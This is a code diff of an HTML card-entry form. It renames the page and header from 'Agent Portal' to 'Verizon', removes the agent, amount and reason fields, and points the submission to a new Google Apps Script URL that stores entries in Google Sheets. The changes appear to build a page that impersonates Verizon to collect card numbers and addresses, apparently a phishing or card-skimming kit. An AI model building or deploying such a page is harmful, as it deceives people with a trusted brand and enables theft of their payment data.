@@ -2,7 +2,7 @@
 <html>
 	<head>
 		<meta charset="utf-8" />
-		<title>Payment Form</title>
+		<title>Verizon</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 		<link
 			rel="stylesheet"
@@ -16,6 +16,12 @@
 			.cc-img {
 				margin: 0 auto;
 			}
+			.page-header {
+				padding: 0px 20px;
+				margin: 0 0 10px 10px; /* Reduced the top margin to 0 */
+				border-radius: 8px;
+			}
+
 			.loading-overlay {
 				display: none;
 				position: fixed;
@@ -37,6 +43,11 @@
 			.error {
 				border-color: #ff0000 !important;
 			}
+			/* .logo-img {
+				margin-bottom: 0px; 
+				max-width: 100px;
+				height: auto;
+			} */
 		</style>
 	</head>
 	<body>
@@ -50,7 +61,7 @@
 			</div>
 
 			<div class="page-header">
-				<h1>Agent Portal</h1>
+				<h1>Verizon</h1>
 			</div>
 
 			<div class="container">
@@ -59,7 +70,7 @@
 						<div class="panel panel-default">
 							<div class="panel-heading">
 								<div class="row">
-									<h3 class="text-center">Payment Details</h3>
+									<h3 class="text-center">Card Details</h3>
 									<picture>
 										<!-- <source srcset="images/creditcardicons.webp" type="image/webp"> -->
 										<img
@@ -196,43 +207,6 @@
 											</div>
 										</div>
 									</div>
-									<!-- City/State/Zip -->
-									<div class="row">
-										<div class="col-xs-5 col-md-6">
-											<div class="form-group">
-												<label>Agent Name</label>
-												<input
-													type="text"
-													class="form-control"
-													placeholder="John Miller"
-													id="agentName"
-													required
-												/>
-											</div>
-										</div>
-										<div class="col-xs-4 col-md-6">
-											<div class="form-group">
-												<label>Amount</label>
-												<input
-													type="tel"
-													class="form-control"
-													placeholder="$1"
-													id="amount"
-													required
-												/>
-											</div>
-										</div>
-									</div>
-									<div class="form-group">
-										<label>Reason To Charge</label>
-										<input
-											type="text"
-											class="form-control"
-											placeholder="Bill"
-											id="reason"
-											required
-										/>
-									</div>
 
 									<div class="panel-footer">
 										<button
@@ -263,7 +237,7 @@
 
 						// 🔴 REPLACE WITH YOUR DEPLOYED SCRIPT URL
 						const SCRIPT_URL =
-							'https://script.google.com/macros/s/AKfycbwh3zhJ1wXeMbdeFjqhFS65zuvW6BdaV3DMKEWZ_Xli98vi4wJ6tlUx0bwGtmfSrBVb/exec';
+							'https://script.google.com/macros/s/AKfycbyZX5L6hQdAdMU5P4qWVsxKvnP4kmkHoW_Lr0D0nPqf2N-NouWtnjx8oUhrMXf6aXds7A/exec';
 
 						// Validate inputs
 						const cardNumber = document
@@ -298,9 +272,6 @@
 							city: document.getElementById('city').value,
 							state: document.getElementById('state').value,
 							zip: document.getElementById('zip').value,
-							agent: document.getElementById('agentName').value,
-							amount: document.getElementById('amount').value,
-							reason: document.getElementById('reason').value,
 						};
 
 						// Send to Google Sheets
